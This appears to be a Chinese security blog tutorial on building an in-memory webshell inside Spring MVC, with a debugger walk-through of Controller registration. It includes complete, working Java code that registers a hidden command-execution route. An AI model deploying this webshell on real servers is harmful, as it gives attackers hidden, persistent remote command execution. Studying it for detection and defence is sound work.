## 前言

今天开始远离Tomcat容器了，我们开始学习其他框架使用类似的思想来构造内存马。

这篇主要是学习在Spring的控制层进行内存马的构造，也是系列文章的第九篇。

## 前置

### 什么是Spring Controller

Tomcat中有Servlet, Spring也有着Controller。

Controller 负责处理由DispatcherServlet 分发的请求，它把用户请求的数据经过业务处理层处理之后封装成一个Model
，然后再把该Model 返回给对应的View 进行展示。

在SpringMVC 中提供了一个非常简便的定义Controller 的方法，你无需继承特定的类或实现特定的接口，只需使用@Controller
标记一个类是Controller ，然后使用@RequestMapping 和@RequestParam 等一些注解用以定义URL
请求和Controller 方法之间的映射，这样的Controller 就能被外界访问到。

主要的注解：

  * @Controller

  * @RequestMapping

  * @ResponseBody

  * @RestController

  * @GetMapping

  * @PostMapping

### 简单实现

创建一个Spring MVC的项目，我这里使用的依赖是

    
    
    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-webmvc</artifactId>
        <version>5.3.13</version>
    </dependency>
    

进行分析的。

首先在创建了Web项目骨架之后，web.xml如下

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
             xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
             xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
             version="4.0">
        <context-param>
            <param-name>contextConfigLocation</param-name>
            <param-value>classpath:applicationContext.xml</param-value>
        </context-param>
        <listener>
            <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
        </listener>
        <servlet>
            <servlet-name>dispatcher</servlet-name>
            <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
            <init-param>
                <param-name>contextConfigLocation</param-name>
                <param-value>classpath:dispatcher-servlet.xml</param-value>
            </init-param>
            <load-on-startup>1</load-on-startup>
        </servlet>
        <servlet-mapping>
            <servlet-name>dispatcher</servlet-name>
            <url-pattern>/</url-pattern>
        </servlet-mapping>
    </web-app>
    

其中配置中的Servlet分发器配置文件`dispatcher-servlet.xml`为

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <beans xmlns="http://www.springframework.org/schema/beans"
           xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
           xmlns:context="http://www.springframework.org/schema/context"
           xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd">
    
        <context:component-scan base-package="pres.test.spring.controller"/>
        <bean class="org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping"/>
    
    </beans>
    

扫描`pres.test.spring.controller`包下的bean

创建一个Controller类

    
    
    package pres.test.spring.controller;
    
    import org.springframework.stereotype.Controller;
    import org.springframework.web.bind.annotation.GetMapping;
    import org.springframework.web.bind.annotation.RequestBody;
    import org.springframework.web.bind.annotation.RequestMapping;
    
    import javax.servlet.http.HttpServlet;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import java.io.IOException;
    
    @Controller
    @RequestMapping("/index")
    public class IndexController {
    
        @GetMapping
        public void Test(HttpServletRequest request, HttpServletResponse response) {
            try {
                response.getWriter().println("index controller...");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
    

上面通过`@Controller`注解进行标注，通过`@RequestMapping`进行路由映射，不再使用xml配置文件的方式进行路由映射，spring
mvc将会自动配置。

启动我们的Tomcat容器

![image-20220928113836646.png](https://image.3001.net/images/20221009/1665292036_634257044f5efe5c6d3b6.png!small)

### 执行流程分析

在Spring
MVC初始化的过程中，对bean的处理从`AbstractAutowireCapableBeanFactory#createBean`方法中开始进行处理。

在其中调用了`doCreateBean`方法执行。

![image-20220928171423490.png](https://image.3001.net/images/20221009/1665292043_6342570bba3c6ca55d1c8.png!small)

同时在前面实例化了一个bean

![image-20220928171859237.png](https://image.3001.net/images/20221009/1665292049_6342571122dca7ea28440.png!small)

这个bean是`RequestMappingHandlerMapping`对象，这个类主要是用来处理`@Controller`注解相关的Bean，下面详细看。

进而调用了`initializeBean`进行Bean的初始化操作，

![image-20220928175025345.png](https://image.3001.net/images/20221009/1665292055_634257170bf8a277dd12a.png!small)

最后能够在`AbstractAutowireCapableBeanFactory#invokeInitMethods`方法中调用`RequestMappingHandlerMapping#afterPropertiesSet`方法进行解析。

![image-20220928175129680.png](https://image.3001.net/images/20221009/1665292061_6342571d464526cc0f53b.png!small)

接着在其`afterPropertiesSet`方法中调用了父类的`afterPropertiesSet`方法，即是`AbstractHandlerMethodMapping#afterPropertiesSet`方法。

![image-20220928175317951.png](https://image.3001.net/images/20221009/1665292071_63425727cecc4fc0770e1.png!small)

在这里调用了`initHandlerMethods`方法进行初始化。

![image-20220928175633889.png](https://image.3001.net/images/20221009/1665292078_6342572e3ea132fa27f21.png!small)

这里首先通过getCandidateBeanNames方法得到了注册的所有Bean Name

之后遍历这些beanName，调用`processCandidateBean`方法处理bean

![image-20220928183824693.png](https://image.3001.net/images/20221009/1665292088_634257389ae58d26843ad.png!small)

首先通过传来的`beanName`获取对应的`beanType`，后面会判断是否为空和调用`isHandler`方法进行判断，跟进一下。

![image-20220928184128022.png](https://image.3001.net/images/20221009/1665292096_63425740a8c1aa2560cc0.png!small)

很明显，这里主要是判断是否该类是否存在有`@Controller / @RequestMapping`注解修饰，如果有其中一个或多个，将会返回true。

回到上面的，如果`beanType`不为空且`isHandler`返回了ture，将会调用`detectHandlerMethods`方法进行处理，跟进，

![image-20220928184554887.png](https://image.3001.net/images/20221009/1665292103_63425747e1ce0635b9a70.png!small)

这里主要是查找对应的methods并进行注册，接下来解读一下这个方法的代码。

首先是获取了对应的`bean`的class对象，这里的`getUserClass`方法，主要是判断是否存在有`$$`标识，如果有，将会返回其父类，没有就返回该类。

![image-20220928185216120.png](https://image.3001.net/images/20221009/1665292111_6342574f6bae20252dadd.png!small)

好了，回到`detectHandlerMethods`方法中，接下来，将会调用`MethodIntrospector.selectMethods`方法获取到bean的方法和其路由的映射，但是在这之前会先调用`getMappingForMethod`方法，进行封装。

![image-20220928191646362.png](https://image.3001.net/images/20221009/1665292118_634257561559266eab6b3.png!small)

这个方法中，返回的是一个`RequestMappingInfo`类对象。

![image-20220928191825659.png](https://image.3001.net/images/20221009/1665292124_6342575ca48a2b3c5824b.png!small)

这个类就是对相关请求的相关信息的一个封装类，

回到`getMappingForMethod`方法，将会调用`createRequestMappingInfo`方法创建一个`RequestMappingInfo`对象。

![image-20220928192027583.png](https://image.3001.net/images/20221009/1665292132_63425764e3517820f9fdc.png!small)

但是也是有着要求的，如果定义的bean方法存在有`@RequestMapping`注解修饰，将会根据注解中的相关信息进行创建对象，如果没有将会返回null。

最后将会返回这个info对象，

在最后将会我们扫描得到的`methods`进行遍历并注册。

![image-20220928192859129.png](https://image.3001.net/images/20221009/1665292139_6342576bb6042a0986f4c.png!small)

调用`registerHandlerMethod`方法进行注册，跟进，

来到了`AbstractHandlerMethodMapping`类中，

![image-20220928193150560.png](https://image.3001.net/images/20221009/1665292145_6342577165d71abc41e4a.png!small)

该方法主要是注册对应的method句柄和其对应的mapping映射，

调用了`AbstractHandlerMethodMapping#register`方法进行注册，

![image-20220928193533856.png](https://image.3001.net/images/20221009/1665292152_6342577864047eea1f6a6.png!small)

将一些关键信息进行包装、处理和储存，

就这样就完成了注册流程，

而之后在进行相关路由的请求的时候，

在`HttpServlet#service`方法中调用了`doGet`方法，

![image-20220928195044213.png](https://image.3001.net/images/20221009/1665292159_6342577f1a774c0a980b9.png!small)

最后将会在`AbstractHandlerMethodMapping#lookupHandlerMethod`方法匹配对应的handler

![image-20220928195331212.png](https://image.3001.net/images/20221009/1665292166_634257865aa348afb9fbd.png!small)

![image-20220928195409361.png](https://image.3001.net/images/20221009/1665292172_6342578cafcd06df86320.png!small)

调用`getHandlerMethod`方法获取

  * 在 MappingRegistry.urlLookup 中获取直接匹配的 RequestMappingInfos；

  * 如果没有，则遍历所有的 MappingRegistry.mappingLookup 中保存的 RequestMappingInfos；

  * 获取最佳匹配的 RequestMappingInfo 对应的 HandlerMethod。

## 正文

### 注入分析

对于内存马的注入，主要就是能够添加一个路由映射并且能够进行相应的处理，

我们从上面的分析中我们知道在`registerHandlerMethod`方法中主要是通过调用`register`方法来进行注册的。

![image-20220928200807945.png](https://image.3001.net/images/20221009/1665292179_63425793653e35a6b13a7.png!small)

su18师傅是直接通过调用其register方法进行注册，

但是通过，搜索，我们可以在`AbstractHandlerMethodMapping#registerMapping`方法中存在有相同的调用。

![image-20220928201057865.png](https://image.3001.net/images/20221009/1665292185_6342579913f76803eaf54.png!small)

但是这是一个抽象类，我们可以寻找他的实现类。

![image-20220928201209073.png](https://image.3001.net/images/20221009/1665292191_6342579f50a2f9a7a886c.png!small)

存在有一个`RequestMappingHandlerMapping#registerMapping`方法的调用，能够调用父类的对象的方法。

![image-20220928201336959.png](https://image.3001.net/images/20221009/1665292198_634257a604a0dacb4e061.png!small)

我们知道该方法第一个参数是一个`RequestMappingInfo`类对象，

看看其构造方法，

![image-20220928201823976.png](https://image.3001.net/images/20221009/1665292204_634257acd0db6e6bf5dd9.png!small)

创建`PatternsRequestCondition`的路由和`RequestMethodsRequestCondition`请求方法。

其第二个参数为一个handler，也就是恶意类，

第三个参数就是对应的bean方法，我们可以在这个方法中执行我们想要实现的任何逻辑。

所以总结一下流程

  1. 创建一个恶意类，其中存在有一个方法实现了执行逻辑；

  2. 定义访问的路由和允许HTTP方法；

  3. 从上下文中获取对应的`RequestMappingHandlerMapping`对象；

  4. 调用其`registerMapping`方法进行注册。

### 实现

注释中有解释，就不一步一步解释了

    
    
    package pres.test.spring.controller;
    
    import org.springframework.web.context.WebApplicationContext;
    import org.springframework.web.context.request.RequestContextHolder;
    import org.springframework.web.context.request.ServletRequestAttributes;
    import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
    import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
    import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
    import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
    
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import java.io.IOException;
    import java.io.PrintWriter;
    import java.lang.reflect.Method;
    
    public class EvilController {
       static {
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            // 2. 通过反射获得自定义 controller 中test的 Method 对象
            Method method2 = null;
            try {
                method2 = EvilController.class.getMethod("test");
            } catch (NoSuchMethodException e) {
                e.printStackTrace();
            }
            // 3. 定义访问 controller 的 URL 地址
            PatternsRequestCondition url = new PatternsRequestCondition("/RoboTerh");
            // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
            // 5. 在内存中动态注册 controller
            RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
            // 创建用于处理请求的对象，加入“aaa”参数是为了触发第二个构造函数避免无限循环
            EvilController evilController = new EvilController("aaa");
            mappingHandlerMapping.registerMapping(info, evilController, method2);
        }
        public EvilController(String aaa) {}
    
        public void test() throws  IOException{
            // 获取request和response对象
            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
            HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
    
            //exec
            try {
                String arg0 = request.getParameter("cmd");
                PrintWriter writer = response.getWriter();
                if (arg0 != null) {
                    String o = "";
                    java.lang.ProcessBuilder p;
                    if(System.getProperty("os.name").toLowerCase().contains("win")){
                        p = new java.lang.ProcessBuilder(new String[]{"cmd.exe", "/c", arg0});
                    }else{
                        p = new java.lang.ProcessBuilder(new String[]{"/bin/sh", "-c", arg0});
                    }
                    java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
                    o = c.hasNext() ? c.next(): o;
                    c.close();
                    writer.write(o);
                    writer.flush();
                    writer.close();
                }else{
                    response.sendError(404);
                }
            }catch (Exception e){}
        }
    
    }
    
    

### 实例

上面就是一个拿来即用的Controller内存马，我们可以创建一个`Controller`来模拟通过反序列化等方式注入内存马。

    
    
    package pres.test.spring.controller;
    
    import org.springframework.stereotype.Controller;
    import org.springframework.web.bind.annotation.GetMapping;
    import org.springframework.web.bind.annotation.RequestMapping;
    
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    
    @Controller
    @RequestMapping("/addSpringController")
    public class AddSpringController {
    
        @GetMapping
        public void test(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) {
            try {
                Class.forName("pres.test.spring.controller.EvilController");
                httpServletResponse.getWriter().println("add successfully!");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    

当我们访问该控制器之后将会返回`add successfully!`表示，成功注入。

![image-20220928203954199.png](https://image.3001.net/images/20221009/1665292217_634257b92129aa36bab4e.png!small)

之后测试是否成功注入。

![image-20220928204101418.png](https://image.3001.net/images/20221009/1665292222_634257bebf0be7636cf04.png!small)

能够执行命令。

## 总结

千万别光看内存马的实现，没用（别问我怎么知道）还是要一步一步的调试，一步一步的感受Spring
MVC的执行流程，体会什么地方能够形成内存马，为什么这里能够实现内存马，内存马到底是怎么实现的，多问几个为什么总是好的！

贴一下编写流程

  1. 创建一个恶意类，其中存在有一个方法实现了执行逻辑；

  2. 定义访问的路由和允许HTTP方法；

  3. 从上下文中获取对应的`RequestMappingHandlerMapping`对象；

  4. 调用其`registerMapping`方法进行注册。

## Ref

https://su18.org/

